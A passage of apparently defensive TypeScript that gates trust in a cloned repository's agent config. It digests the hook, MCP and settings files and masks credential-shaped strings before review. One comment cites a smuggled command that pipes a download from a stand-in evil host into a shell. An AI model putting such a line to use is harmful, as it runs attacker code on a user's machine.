import { createHash } from 'node:crypto'
import { closeSync, constants as fsConstants, fstatSync, lstatSync, opendirSync, openSync, readlinkSync, readSync, realpathSync } from 'node:fs'
import { dirname, join, resolve } from 'node:path'
import type {
  FolderConfigAllowRule,
  FolderConfigCommand,
  FolderConfigEnv,
  FolderConfigFile,
  FolderConfigMcpServer,
  FolderConfigOtherSetting,
  FolderConfigReview,
  FolderConfigState,
  FolderConfigTrust,
  FolderConfigTrustInput,
  Project,
  RepoConfigEffect
} from '@shared/types'
import { FOLDER_CONFIG_FILE_TEXT_MAX, FOLDER_CONFIG_LIST_MAX, FOLDER_CONFIG_TOTAL_TEXT_MAX, REPO_CONFIG_PATHS } from '@shared/types'
import { projectKindOf } from '@shared/defaults'
import { clampText, hiddenCharIn, isSecretFlag, isSecretName } from '../capabilities/sanitize'
import { credentialLikeName } from '../mcp/validate'
import { isInsideEither, isNetworkPath } from '../quick/scratch'
import { parseToml } from '../setup/import/toml'
import { isClaudeRoutingVar } from './childEnv'
import { addRulesReport, allowRuleRefusal, readableRule, removeRule } from './permissionRules'

/**
 * Folder config trust (provider-neutral half). A project whose folder came with agent config of its own (a cloned
 * repository) starts 'untrusted': runs ignore that config until the user has read it and accepted it. Acceptance
 * binds a digest of everything in the folder that can run commands, start tools or grant permissions; any change
 * afterwards reads as 'changed' and the config stops loading again. Everything read here is untrusted data from
 * whoever wrote the folder: it is only parsed, masked and displayed, never executed.
 *
 * Projects stored before this feature have no folderConfigTrust field and stay 'none' (no gate, as before). That is
 * deliberate: a legacy project's folder was chosen by its owner before OrgAI cloned foreign repositories.
 *
 * What the digest covers, in plain words. It covers every file and folder name under the config paths that can run
 * commands or start tools (REPO_CONFIG_PATHS with the effect 'runs-commands' or 'tools': the Claude settings files,
 * hooks, the .codex folder, .mcp.json, agents, commands, skills, rules and so on): the name, what kind of thing it is,
 * the sha256 of every byte of a file, where a link points and (outside Windows) whether a file is executable. It follows
 * a link that stays inside the project and covers what it points to; a link that leaves the project makes the config
 * unreviewable. It does not cover the instruction files (CLAUDE.md, AGENTS.md and the like) or .orgai/org.json,
 * because OrgAI's own setup rewrites those and instructions are only text agents read; the one exception is a link in
 * one of those places: its kind and target are covered, because a link can point a file at something else without any
 * byte of the project changing. A plain instruction file adds nothing, present or absent. Rules the user saves with
 * "Always allow for project" live in OrgAI's data folder, not in the project, so they never change the digest.
 *
 * What the digest does NOT bind. A hook is bound as the command line written in the config; a script that command
 * names outside the config paths above (`node ../tools/pre.js`) is not covered, so editing it does not make the
 * config read as 'changed'. Frontmatter `hooks:` inside skills, agents and commands is part of those files' bytes
 * (digested), but the review shows it only as the file's raw text; it is not extracted into the commands list.
 */

const MAX_DEPTH = 12
const MAX_ENTRIES = 5000
const MAX_BYTES = 64 * 1024 * 1024
const CHUNK = 64 * 1024
/** Largest settings / MCP / hooks file OrgAI parses for review; a bigger one is unreviewable. */
const STRUCTURED_MAX = 256 * 1024
/** Bytes kept in memory per file (the review shows at most this much) and for all files together. */
const RETAIN_PER_FILE = STRUCTURED_MAX
const RETAIN_TOTAL = 8 * 1024 * 1024
/** Longest single command, helper, MCP target, env value, allow rule or setting shown; a longer one is unreviewable, never cut. */
const FIELD_MAX = 4000
const MASK = '[masked]'
const EMPTY_DIGEST = createHash('sha256').update('').digest('hex')
const DIGEST_RE = /^[0-9a-f]{64}$/
/**
 * O_NONBLOCK where the platform has it, so opening a file that turned into a pipe cannot hang the main process, and
 * O_NOFOLLOW where it exists, so a file swapped for a link between lstat and open is not followed.
 */
const OPEN_FLAGS =
  fsConstants.O_RDONLY |
  (typeof fsConstants.O_NONBLOCK === 'number' ? fsConstants.O_NONBLOCK : 0) |
  (typeof fsConstants.O_NOFOLLOW === 'number' ? fsConstants.O_NOFOLLOW : 0)

const SETTINGS_FILES = ['.claude/settings.json', '.claude/settings.local.json'] as const
const STRUCTURED = new Set<string>([...SETTINGS_FILES, '.codex/hooks.json', '.mcp.json', '.codex/config.toml'])
const LOCAL_RULES_FILE = '.claude/settings.local.json'

function sha256(s: string): string {
  return createHash('sha256').update(s).digest('hex')
}

function codeOf(e: unknown): string | undefined {
  return typeof e === 'object' && e !== null && typeof (e as { code?: unknown }).code === 'string' ? (e as { code: string }).code : undefined
}

/** A path for a sentence: one line, no hidden characters (the folder's names are untrusted). */
function P(rel: string): string {
  return hiddenCharIn(rel) ? clampText(rel, 200) : rel.length > 300 ? `${rel.slice(0, 299)}…` : rel
}

// ---------- Presence ----------

/**
 * The REPO_CONFIG_PATHS present in `root`, in table order. Only lstat; a link on the way counts as present and is
 * never followed. A segment that cannot be read for any reason but "not there" (ENOENT, ENOTDIR) counts as present
 * (fail closed). A network path returns [] here (no file-system access); `initialFolderConfigTrust` gates it anyway.
 */
export function presentConfigPaths(root: string): string[] {
  const out: string[] = []
  if (typeof root !== 'string' || !root || isNetworkPath(root)) return out
  for (const { path } of REPO_CONFIG_PATHS) {
    const parts = path.split('/')
    let cur = root
    let found = true
    for (let i = 0; i < parts.length; i++) {
      cur = join(cur, parts[i])
      try {
        const st = lstatSync(cur)
        if (st.isSymbolicLink()) break
      } catch (e) {
        const c = codeOf(e)
        if (c === 'ENOENT' || c === 'ENOTDIR') found = false
        break
      }
    }
    if (found) out.push(path)
  }
  return out
}

/**
 * The gate a new project starts with: a code project whose folder holds anything from REPO_CONFIG_PATHS is 'untrusted'.
 * A project folder on the network is always 'untrusted' (nothing is looked at, and the scan reports it unreviewable).
 */
export function initialFolderConfigTrust(project: { path: string; kind?: unknown }): FolderConfigTrust | undefined {
  if (projectKindOf(project) === 'engagement') return undefined
  if (typeof project.path === 'string' && project.path && isNetworkPath(project.path)) return { state: 'untrusted' }
  return presentConfigPaths(project.path).length > 0 ? { state: 'untrusted' } : undefined
}

// ---------- Scan ----------

interface Entry {
  rel: string
  kind: 'file' | 'link' | 'other' | 'dir'
  size: number
  hash: string
  effect: RepoConfigEffect
  digested: boolean
  /** A digested file with an execute bit (not on Windows). */
  exec?: boolean
  linkTarget?: string
  buf?: Buffer
}

class Stop extends Error {}

interface Scan {
  root: string
  entries: Entry[]
  lines: string[]
  count: number
  bytes: number
  retained: number
  realSeen: Set<string>
  seenRel: Set<string>
  unreviewable?: string
}

export interface FolderConfigScan {
  /** Lowercase sha256 hex of what the digest binds. */
  digest: string
  unreviewable?: string
  /** @internal */
  entries: Entry[]
  /** @internal memo of analyze() */
  analysis?: Analysis
}

function note(s: Scan, reason: string): void {
  if (!s.unreviewable) s.unreviewable = reason
}

function add(s: Scan, e: Entry, line?: string): void {
  if (++s.count > MAX_ENTRIES) {
    note(s, `This folder's agent config has more than ${MAX_ENTRIES.toLocaleString('en-US')} files; OrgAI reads at most ${MAX_ENTRIES.toLocaleString('en-US')}.`)
    throw new Stop()
  }
  s.entries.push(e)
  // A link is always bound (kind and target), even in a place whose content is not.
  if (e.digested || e.kind === 'link') s.lines.push(line ?? `${e.rel}\0${e.kind}\0${e.hash}${e.exec ? '\0x' : ''}\n`)
}

/** The folder's entry names, read one at a time so a huge folder stops at the cap instead of being listed whole. */
function listDir(s: Scan, abs: string, rel: string): string[] {
  let dir
  try {
    dir = opendirSync(abs)
  } catch {
    note(s, `Could not read ${P(rel)}.`)
    throw new Stop()
  }
  const names: string[] = []
  try {
    for (;;) {
      const d = dir.readSync()
      if (!d) break
      names.push(d.name)
      if (s.count + names.length > MAX_ENTRIES) {
        note(s, `The folder ${P(rel)} has more than ${MAX_ENTRIES.toLocaleString('en-US')} files; OrgAI reads at most ${MAX_ENTRIES.toLocaleString('en-US')} files of agent config.`)
        throw new Stop()
      }
    }
  } catch (e) {
    if (e instanceof Stop) throw e
    note(s, `Could not read ${P(rel)}.`)
    throw new Stop()
  } finally {
    try {
      dir.closeSync()
    } catch {
      /* nothing to do */
    }
  }
  return names.sort()
}

/** Opens a file for reading without blocking and checks, on the open descriptor, that it is a regular file. */
function openPlain(abs: string): number | null {
  const fd = openSync(abs, OPEN_FLAGS)
  try {
    if (!fstatSync(fd).isFile()) {
      closeSync(fd)
      return null
    }
  } catch (e) {
    try {
      closeSync(fd)
    } catch {
      /* nothing to do */
    }
    throw e
  }
  return fd
}

function readChunked(s: Scan, abs: string, rel: string, keep: number): { hash: string; size: number; buf?: Buffer } {
  let fd: number | undefined
  try {
    const opened = openPlain(abs)
    if (opened === null) {
      note(s, `${P(rel)} was not a plain file when OrgAI read it.`)
      throw new Stop()
    }
    fd = opened
    const h = createHash('sha256')
    const chunk = Buffer.alloc(CHUNK)
    const kept: Buffer[] = []
    let keptLen = 0
    let size = 0
    for (;;) {
      const n = readSync(fd, chunk, 0, CHUNK, null)
      if (n <= 0) break
      size += n
      s.bytes += n
      if (s.bytes > MAX_BYTES) {
        note(s, `This folder's config is larger than ${MAX_BYTES / (1024 * 1024)} MB.`)
        throw new Stop()
      }
      h.update(chunk.subarray(0, n))
      if (keptLen < keep) {
        const take = Math.min(n, keep - keptLen)
        kept.push(Buffer.from(chunk.subarray(0, take)))
        keptLen += take
      }
    }
    return { hash: h.digest('hex'), size, ...(keptLen ? { buf: Buffer.concat(kept) } : {}) }
  } catch (e) {
    if (e instanceof Stop) throw e
    note(s, `Could not read ${P(rel)}.`)
    throw new Stop()
  } finally {
    if (fd !== undefined) {
      try {
        closeSync(fd)
      } catch {
        /* nothing to do */
      }
    }
  }
}

/** How many bytes of a file to keep: all structured files up to their cap, others while the shared budget lasts. */
function keepFor(s: Scan, rel: string, size: number): number {
  if (STRUCTURED.has(rel)) return Math.min(size, STRUCTURED_MAX)
  const room = Math.max(0, RETAIN_TOTAL - s.retained)
  return Math.min(size, RETAIN_PER_FILE, room)
}

function isExec(mode: number): boolean {
  return process.platform !== 'win32' && (mode & 0o111) !== 0
}

function addFile(s: Scan, abs: string, rel: string, size: number, mode: number, effect: RepoConfigEffect, digested: boolean): void {
  if (STRUCTURED.has(rel) && size > STRUCTURED_MAX) note(s, `${P(rel)} is larger than ${STRUCTURED_MAX / 1024} KB, too large to review.`)
  if (digested) {
    const r = readChunked(s, abs, rel, keepFor(s, rel, size))
    if (r.buf) s.retained += r.buf.length
    add(s, { rel, kind: 'file', size: r.size, hash: r.hash, effect, digested, ...(isExec(mode) ? { exec: true } : {}), ...(r.buf ? { buf: r.buf } : {}) })
    return
  }
  // Listing only: read the head for display, never hashed.
  const keep = keepFor(s, rel, size)
  let buf: Buffer | undefined
  if (keep > 0) {
    let fd: number | undefined
    try {
      const opened = openPlain(abs)
      if (opened !== null) {
        fd = opened
        const b = Buffer.alloc(keep)
        const n = readSync(fd, b, 0, keep, 0)
        buf = b.subarray(0, n)
        s.retained += n
      }
    } catch {
      buf = undefined
    } finally {
      if (fd !== undefined) {
        try {
          closeSync(fd)
        } catch {
          /* nothing to do */
        }
      }
    }
  }
  add(s, { rel, kind: 'file', size, hash: '', effect, digested: false, ...(buf ? { buf } : {}) })
}

function visit(s: Scan, abs: string, rel: string, depth: number, effect: RepoConfigEffect, digested: boolean): void {
  if (s.seenRel.has(rel)) return
  s.seenRel.add(rel)
  if (depth > MAX_DEPTH) {
    note(s, `${P(rel)} is nested deeper than ${MAX_DEPTH} folders.`)
    throw new Stop()
  }
  let st
  try {
    st = lstatSync(abs)
  } catch (e) {
    const c = codeOf(e)
    if (c === 'ENOENT' || c === 'ENOTDIR') return
    note(s, `Could not read ${P(rel)}.`)
    throw new Stop()
  }
  if (st.isSymbolicLink()) {
    visitLink(s, abs, rel, depth, effect, digested)
    return
  }
  if (st.isFile()) {
    addFile(s, abs, rel, st.size, st.mode, effect, digested)
    return
  }
  if (st.isDirectory()) {
    add(s, { rel, kind: 'dir', size: 0, hash: EMPTY_DIGEST, effect, digested })
    for (const name of listDir(s, abs, rel)) visit(s, join(abs, name), `${rel}/${name}`, depth + 1, effect, digested)
    return
  }
  // FIFO, socket, device: never opened (a FIFO would block), hashed by kind only.
  add(s, { rel, kind: 'other', size: 0, hash: EMPTY_DIGEST, effect, digested })
}

function visitLink(s: Scan, abs: string, rel: string, depth: number, effect: RepoConfigEffect, digested: boolean): void {
  let target: string
  try {
    target = readlinkSync(abs)
  } catch {
    note(s, `Could not read ${P(rel)}.`)
    throw new Stop()
  }
  // The link itself (kind and target) is bound even where the content it reaches is not (instruction files).
  add(s, { rel, kind: 'link', size: 0, hash: sha256(target), effect, digested, linkTarget: target.slice(0, 1000) })
  // Resolving a network path would open a connection: decide on the spelling alone.
  if (isNetworkPath(target) || isNetworkPath(resolve(dirname(abs), target))) {
    note(s, `${P(rel)} links outside the project folder.`)
    return
  }
  let real: string
  try {
    real = realpathSync.native(abs)
  } catch {
    note(s, `${P(rel)} is a broken link.`)
    return
  }
  if (isNetworkPath(real) || !isInsideEither(s.root, real)) {
    note(s, `${P(rel)} links outside the project folder.`)
    return
  }
  let st
  try {
    st = lstatSync(real)
  } catch {
    note(s, `${P(rel)} is a broken link.`)
    return
  }
  if (!digested) {
    // What an instruction link points at may change freely, but what kind of thing it is may not.
    s.lines.push(`${rel}\0target-${st.isDirectory() ? 'dir' : st.isFile() ? 'file' : 'other'}\n`)
    return
  }
  if (st.isDirectory()) {
    if (s.realSeen.has(real)) return
    s.realSeen.add(real)
    if (depth + 1 > MAX_DEPTH) {
      note(s, `${P(rel)} is nested deeper than ${MAX_DEPTH} folders.`)
      throw new Stop()
    }
    for (const name of listDir(s, real, rel)) visit(s, join(real, name), `${rel}/${name}`, depth + 1, effect, digested)
  } else if (st.isFile()) {
    const r = readChunked(s, real, rel, 0)
    s.lines.push(`${rel}\0target-file\0${r.hash}${isExec(st.mode) ? '\0x' : ''}\n`)
  } else {
    s.lines.push(`${rel}\0target-other\0${EMPTY_DIGEST}\n`)
  }
}

function inDigestScope(path: string, effect: RepoConfigEffect): boolean {
  return effect !== 'instructions' && path !== '.orgai/org.json'
}

/**
 * Read the folder's agent config once: the digest and everything the review shows. Never throws. See the header of
 * this file for the scope; instruction files and .orgai/org.json are listed but their bytes are not digested.
 */
export function scanFolderConfig(root: string): FolderConfigScan {
  const s: Scan = { root, entries: [], lines: [], count: 0, bytes: 0, retained: 0, realSeen: new Set(), seenRel: new Set() }
  if (typeof root !== 'string' || !root || isNetworkPath(root)) {
    return { digest: EMPTY_DIGEST, unreviewable: 'The project folder is on the network, so its config cannot be reviewed.', entries: [] }
  }
  try {
    for (const { path, effect } of REPO_CONFIG_PATHS) {
      const digested = inDigestScope(path, effect)
      const parts = path.split('/')
      let cur = root
      let rel = ''
      for (let i = 0; i < parts.length; i++) {
        cur = join(cur, parts[i])
        rel = rel ? `${rel}/${parts[i]}` : parts[i]
        let st
        try {
          st = lstatSync(cur)
        } catch (e) {
          const c = codeOf(e)
          if (c === 'ENOENT' || c === 'ENOTDIR') break
          note(s, `Could not read ${P(rel)}.`)
          throw new Stop()
        }
        if (st.isSymbolicLink() || i === parts.length - 1) {
          visit(s, cur, rel, i, effect, digested)
          break
        }
      }
    }
    // A structured file that is not a plain file cannot be read for review.
    for (const e of s.entries) {
      if (STRUCTURED.has(e.rel) && e.kind !== 'file') note(s, `${P(e.rel)} is not a plain file, so its content cannot be reviewed.`)
    }
  } catch (e) {
    if (!(e instanceof Stop)) note(s, 'The folder\'s config could not be read.')
  }
  const lines = [...s.lines].sort()
  const digest = lines.length ? sha256(lines.join('')) : EMPTY_DIGEST
  return { digest, ...(s.unreviewable ? { unreviewable: s.unreviewable } : {}), entries: s.entries }
}

// ---------- State ----------

type GateProject = Pick<Project, 'path' | 'kind' | 'folderConfigTrust'>

export function folderConfigStateOf(project: GateProject, scan?: FolderConfigScan): FolderConfigState {
  const t = project.folderConfigTrust as unknown
  if (t === undefined) return 'none'
  if (!t || typeof t !== 'object') return 'untrusted'
  const rec = t as { state?: unknown; digest?: unknown }
  if (rec.state !== 'trusted') return 'untrusted'
  if (typeof rec.digest !== 'string' || !DIGEST_RE.test(rec.digest)) return 'changed'
  try {
    const s = scan ?? scanFolderConfig(project.path)
    return !s.unreviewable && s.digest === rec.digest ? 'trusted' : 'changed'
  } catch {
    return 'changed'
  }
}

/** True when the folder's own config may load right now: no gate, or accepted and unchanged. A broken scan is false. */
export function folderConfigLoadsNow(project: GateProject): boolean {
  try {
    const state = folderConfigStateOf(project)
    return state === 'none' || state === 'trusted'
  } catch {
    return false
  }
}

/** The rebuilt record, undefined stays undefined; anything else present that is not a valid record becomes untrusted. */
export function cleanFolderConfigTrust(v: unknown): FolderConfigTrust | undefined {
  if (v === undefined) return undefined
  if (!v || typeof v !== 'object' || Array.isArray(v)) return { state: 'untrusted' }
  const r = v as Record<string, unknown>
  if (r.state !== 'trusted' && r.state !== 'untrusted') return { state: 'untrusted' }
  const importedRules = Array.isArray(r.importedRules)
    ? [...new Set(r.importedRules.filter((x): x is string => typeof x === 'string' && x.length > 0 && x.length <= 1000))].slice(0, 1000)
    : undefined
  const decidedAt = typeof r.decidedAt === 'string' && r.decidedAt.length <= 40 && !Number.isNaN(Date.parse(r.decidedAt)) ? r.decidedAt : undefined
  const digest = typeof r.digest === 'string' && DIGEST_RE.test(r.digest) ? r.digest : undefined
  const out: FolderConfigTrust = { state: r.state === 'trusted' && digest ? 'trusted' : 'untrusted' }
  if (out.state === 'trusted') out.digest = digest
  if (decidedAt) out.decidedAt = decidedAt
  if (importedRules && importedRules.length) out.importedRules = importedRules
  return out
}

/** The one-sentence run warning for a gated folder, or '' for states that load. */
export function folderConfigWarning(state: FolderConfigState, paths: readonly string[]): string {
  if (state !== 'untrusted' && state !== 'changed') return ''
  const known = new Set(REPO_CONFIG_PATHS.map((p) => p.path))
  const list = paths.filter((p) => known.has(p))
  const shown = list.slice(0, 6).join(', ')
  const more = list.length > 6 ? `, and ${list.length - 6} more` : ''
  const files = list.length ? `: ${shown}${more}` : ''
  return state === 'changed'
    ? `This folder's agent config changed since you accepted it, so it was not loaded${files}. Review it again in Project settings to use it.`
    : `This folder's own agent config was not loaded${files}. Review it in Project settings to use it.`
}

// ---------- Masking ----------
//
// The review exists to show what would run, so hiding code is worse than showing a secret to the machine's own
// user. The rule is therefore inverted: text is shown unaltered unless a substring FULLY matches a credential shape,
// and only that substring is replaced. A credential value is one shell word (it ends at whitespace or ; | & ( ) < >,
// with one pair of enclosing quotes allowed) made only of the characters [\w.~+/=%@:-]. Anything holding another
// character (<>(){}$;|&' " backtick, spaces) is not a credential and stays visible; so does a path (starts with
// . / ~), a value under 6 characters, and a URL. The shapes: URL user info (charset-bound, before the '@'), `Bearer
// <value>`, sk-/pk-/rk-/ghp_/github_pat_/xox/JWT tokens (anchored at a word boundary), `NAME=value` / `NAME: value` /
// `--name=value` / `--name value` with a secret-like name, and a bare 32+ character key-shaped word only directly
// after `=`, `:`, `Bearer` or a secret flag (never as a command word). A secret flag that is a switch (`--anyauth`,
// `--no-auth`) masks the next argument only when that is itself an anchored key shape.
//
// Accepted consequence: `--token abc` (short values), `-u user:pass`, `-pSECRET` and a secret sitting in arbitrary
// text (a value with a space, a TOML args array) may stay visible in the review. It is the user's own machine; a
// real, well-shaped token (sk-..., ghp_..., 32+ characters after TOKEN=) never appears.
//
// Every pattern below is linear on hostile input: quantifiers are bounded, lookbehinds keep an attempt from
// starting inside a word, scanning loops resume after what they consumed, and no value read is longer than
// WORD_CAP characters.

function isObj(v: unknown): v is Record<string, unknown> {
  return !!v && typeof v === 'object' && !Array.isArray(v)
}

function clip(s: string): string {
  return s.length > FIELD_MAX ? `${s.slice(0, FIELD_MAX)}…` : s
}

/** The longest value read as one word; a longer one is never masked (no real credential is that long). */
const WORD_CAP = 1024
/** A single credential-charset word: only these characters. */
const CRED_WORD = /^[\w.~+/=%@:-]+$/
/** A word-ending character in a shell: whitespace or one of ; | & ( ) < >. */
const WORD_END = /[\s;|&()<>]/
const WORD_BODY = /[^\s;|&()<>]{0,1025}/y

/** The value rule: charset-only, at least 6 characters, not a path (a path is a program, not a secret), not a URL. */
function valueMaskable(v: string): boolean {
  return v.length >= 6 && !/^[./~]/.test(v) && !v.includes('://') && CRED_WORD.test(v)
}

const PREFIX_SHAPE = /^(?:(?:sk|pk|rk)-[\w.*-]{3,}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_\w{20,}|xox[abposr]-[\w-]{10,}|eyJ[\w-]{8,}\.[\w-]{8,}\.[\w-]{8,})$/i
const KEY32 = /^[A-Za-z0-9_+-]{32,}={0,2}$/

/** A whole string that is a prefix token or a 32+ character key shape (letters and digits, no '/' or ':'). */
function anchoredKey(v: string): boolean {
  if (PREFIX_SHAPE.test(v)) return true
  return v.length >= 32 && KEY32.test(v) && /[A-Za-z]/.test(v) && /\d/.test(v)
}

function secretLike(name: string): boolean {
  return credentialLikeName(name, true) || isSecretName(name)
}

/** A shell word split into its enclosing quotes and the core, or null when a quote opens and does not close in it. */
function wordParts(w: string): { pre: string; core: string; post: string } | null {
  if (w === '') return null
  const q = w[0]
  if (q === '"' || q === "'") {
    if (w.length < 2 || w[w.length - 1] !== q) return null
    return { pre: q, core: w.slice(1, -1), post: q }
  }
  let end = w.length
  while (end > 0 && (w[end - 1] === '"' || w[end - 1] === "'")) end--
  return { pre: '', core: w.slice(0, end), post: w.slice(end) }
}

/** The word starting at `i` (up to WORD_CAP characters), or null when it is longer than that. */
function wordAt(s: string, i: number): string | null {
  WORD_BODY.lastIndex = i
  const m = WORD_BODY.exec(s)
  const w = m ? m[0] : ''
  if (w.length > WORD_CAP) return null
  return w
}

const VALUE_PARENTS = new Set(['env', 'headers', 'http_headers', 'environment', 'env_http_headers'])

/** A character of URL user info that is also a credential-charset character (no '/', no '@'). */
function userinfoChar(c: number): boolean {
  return (
    (c >= 48 && c <= 57) || (c >= 65 && c <= 90) || (c >= 97 && c <= 122) ||
    c === 95 || c === 46 || c === 126 || c === 43 || c === 37 || c === 58 || c === 61 || c === 45
  )
}

/**
 * `scheme://user:pass@host` -> `scheme://[masked]@host`. Only the user info is replaced, and only when it is a run of
 * credential-charset characters directly followed by '@'; anything else (`http://x;curl evil|sh@h`) stays visible.
 */
function maskUserinfo(s: string): string {
  let out = ''
  let i = 0
  for (;;) {
    const at = s.indexOf('://', i)
    if (at < 0) break
    const start = at + 3
    let j = start
    while (j < s.length && userinfoChar(s.charCodeAt(j))) j++
    if (j > start && s.charCodeAt(j) === 64) {
      out += s.slice(i, start) + MASK
      i = j
    } else {
      out += s.slice(i, start)
      i = start
    }
  }
  return out + s.slice(i)
}

const COOKIE_NAME = /^(?:cookie|set-cookie)$/i
const SCHEME_WORD = /^(?:bearer|basic|digest|negotiate)$/i
/** A secret flag that is a switch: the argument after it is not its value. */
const BOOLEAN_FLAG = /^-{1,2}(?:(?:no|skip|disable|without|allow|enable|use|ignore)[-_]|(?:no|any|skip|disable)(?:auth|pass|password|token|key|secret|cred\w*))/i
/** A key-shaped word that sits alone (no leading name): used after '=' / ':' of any name. */
const KEY_VALUE = /["']?([A-Za-z0-9_+-]{32,512}={0,2})["']?(?![^\s;|&()<>])/y

/** `core` between its quotes is replaced when `want(core)`; the quotes stay. */
function maskWord(w: string, want: (core: string) => boolean): string | null {
  const p = wordParts(w)
  if (!p || !want(p.core)) return null
  return `${p.pre}${MASK}${p.post}`
}

/**
 * `name=value` / `name: value` / `--name=value` / `Name: Bearer value`. A secret-like name masks its value under the
 * value rule (or when it is an anchored key); any other name masks a 32+ character key-shaped value. Everything
 * else, including what follows the value, shows. In a URL query (`?a=1&token=...`) the value also ends at '&' and '#'.
 */
function maskAssignments(s: string): string {
  const head = /(?<![\w.-])(-{0,2})([\w.-]{1,120})(["']?[ \t]{0,4}[=:][ \t]{0,4})/g
  let out = ''
  let last = 0
  let m: RegExpExecArray | null
  while ((m = head.exec(s)) !== null) {
    const name = m[2]
    const afterSep = head.lastIndex
    const query = m.index > 0 && (s[m.index - 1] === '?' || s[m.index - 1] === '&')
    let start = afterSep
    let w: string | null
    let replacement: string | null = null
    let consumed = 0
    if (secretLike(name) || COOKIE_NAME.test(name)) {
      w = wordAt(s, start)
      if (w === null || w === '') continue
      if (query) w = w.split(/[&#]/, 1)[0]
      if (SCHEME_WORD.test(wordParts(w)?.core ?? '')) {
        // `Authorization: Bearer x`: the scheme shows, the credential after it is the value.
        const sp = /[ \t]{1,8}/y
        sp.lastIndex = start + w.length
        const gap = sp.exec(s)
        if (!gap) continue
        start += w.length + gap[0].length
        const w2 = wordAt(s, start)
        if (w2 === null || w2 === '') continue
        w = query ? w2.split(/[&#]/, 1)[0] : w2
        consumed = w.length
        replacement = maskWord(w, valueMaskable)
        if (replacement === null) continue
        out += s.slice(last, start) + replacement
        last = start + consumed
        head.lastIndex = last
        continue
      }
      consumed = w.length
      replacement = maskWord(w, (c) => valueMaskable(c) || anchoredKey(c))
    } else {
      KEY_VALUE.lastIndex = start
      const k = KEY_VALUE.exec(s)
      if (!k) continue
      const key = k[1]
      if (!(/[A-Za-z]/.test(key) && /\d/.test(key))) continue
      const open = k[0][0] === '"' || k[0][0] === "'" ? 1 : 0
      start += open
      consumed = key.length
      replacement = MASK
    }
    if (replacement === null) continue
    out += s.slice(last, start) + replacement
    last = start + consumed
    head.lastIndex = last
  }
  return out + s.slice(last)
}

/** `--token value` / `-k value`: a secret flag followed by one argument. A switch masks only an anchored key. */
function maskFlagValues(s: string): string {
  return s.replace(
    /(?<![\w.-])(--?[A-Za-z][\w.-]{0,59})([ \t]{1,8})(?!-)([^\s;|&()<>]{1,1025})/g,
    (all, flag: string, gap: string, word: string, offset: number, str: string) => {
      if (!isSecretFlag(flag) || word.length > WORD_CAP) return all
      const after = offset + all.length
      if (after < str.length && !WORD_END.test(str[after])) return all
      const bool = BOOLEAN_FLAG.test(flag)
      const r = maskWord(word, (c) => (bool ? PREFIX_SHAPE.test(c) || (!/[/:]/.test(c) && anchoredKey(c)) : valueMaskable(c) || anchoredKey(c)))
      return r === null ? all : `${flag}${gap}${r}`
    }
  )
}

/** `Bearer <value>` anywhere. */
function maskBearer(s: string): string {
  return s.replace(/\bBearer([ \t]{1,8})([^\s;|&()<>]{1,1025})/gi, (all, gap: string, word: string, offset: number, str: string) => {
    if (word.length > WORD_CAP) return all
    const after = offset + all.length
    if (after < str.length && !WORD_END.test(str[after])) return all
    const r = maskWord(word, valueMaskable)
    return r === null ? all : `${all.slice(0, 6)}${gap}${r}`
  })
}

/** sk-/pk-/rk-/ghp_/github_pat_/xox/JWT tokens at a word boundary; the token is the whole charset run (minus trailing . : =). */
function maskPrefixed(s: string): string {
  return s.replace(/(?<![\w.~+/%@-])(?:(?:sk|pk|rk)-|gh[pousr]_|github_pat_|xox[abposr]-|eyJ)[\w.~+/=%@:*-]*/gi, (run: string) => {
    let end = run.length
    while (end > 0 && '.:='.includes(run[end - 1])) end--
    const body = run.slice(0, end)
    return PREFIX_SHAPE.test(body) ? `${MASK}${run.slice(end)}` : run
  })
}

/**
 * Command text, a script line or any display string: only substrings that fully match a credential shape are
 * replaced (see the rule at the top of this section). Applied to everything the review shows.
 */
export function maskText(s: string): string {
  if (typeof s !== 'string' || s === '') return s
  let t = maskUserinfo(s)
  t = maskAssignments(t)
  t = maskFlagValues(t)
  t = maskBearer(t)
  t = maskPrefixed(t)
  return t
}

/** An args list: the argument after a secret flag is masked under the flag rule (a switch only for an anchored key). */
function maskedArgs(args: string[]): string[] {
  const out: string[] = []
  let pending: 'value' | 'switch' | null = null
  for (const a of args) {
    if (pending && !a.startsWith('-')) {
      const bool = pending === 'switch'
      pending = null
      const masked = bool ? PREFIX_SHAPE.test(a) || (!/[/:]/.test(a) && anchoredKey(a)) : valueMaskable(a) || anchoredKey(a)
      out.push(masked ? MASK : maskText(a))
      continue
    }
    pending = isSecretFlag(a) ? (BOOLEAN_FLAG.test(a) ? 'switch' : 'value') : null
    out.push(maskText(a))
  }
  return out
}

/** An env or header value shown in a review: replaced whole only under the value rule, else only its credential parts. */
function shownValue(name: string, value: string): { text: string; masked: boolean } {
  if ((secretLike(name) && valueMaskable(value)) || anchoredKey(value)) return { text: MASK, masked: true }
  const text = maskText(value)
  return { text, masked: text !== value }
}

const HELPER_KEYS = ['apiKeyHelper', 'awsCredentialExport', 'awsAuthRefresh', 'gcpAuthRefresh', 'otelHeadersHelper'] as const
const HELPER_SET = new Set<string>(HELPER_KEYS)

function maskJson(v: unknown, key: string | undefined, parent: string | undefined, depth: number): unknown {
  if (typeof v === 'string') {
    if (key !== undefined && !HELPER_SET.has(key) && !/helper$/i.test(key)) {
      // Under a secret-named key the whole string is replaced only when it is a single credential-charset word
      // (the value rule); a command, a path or anything with other characters shows, with its credentials masked.
      const named = (parent && VALUE_PARENTS.has(parent.toLowerCase()) && credentialLikeName(key, true)) || isSecretName(key)
      if (named && valueMaskable(v)) return MASK
      // An env or header value is a value position: a whole-string anchored key shows nothing either.
      if (parent && VALUE_PARENTS.has(parent.toLowerCase()) && anchoredKey(v)) return MASK
    }
    return maskText(v)
  }
  if (depth > 50) return '[too deep]'
  // An args list: a value after a secret flag, or a credential inside an argument, is masked like an MCP target's.
  if (Array.isArray(v) && key === 'args' && v.every((x) => typeof x === 'string')) return maskedArgs(v as string[])
  if (Array.isArray(v)) return v.map((x) => maskJson(x, undefined, key, depth + 1))
  if (isObj(v)) {
    const out: Record<string, unknown> = Object.create(null) as Record<string, unknown>
    for (const [k, x] of Object.entries(v)) out[k] = maskJson(x, k, key, depth + 1)
    return out
  }
  return v
}

/** File text, line by line (TOML included: there is no special case, a line is just text). */
function maskLines(text: string): string {
  return text.split('\n').map(maskText).join('\n')
}

function decode(buf: Buffer): string | undefined {
  if (buf.includes(0)) return undefined
  return buf.toString('utf8').replace(/^﻿/, '')
}

function parseJsonObject(text: string): unknown {
  try {
    return JSON.parse(text)
  } catch {
    return undefined
  }
}

// ---------- Review extraction ----------

interface Collected {
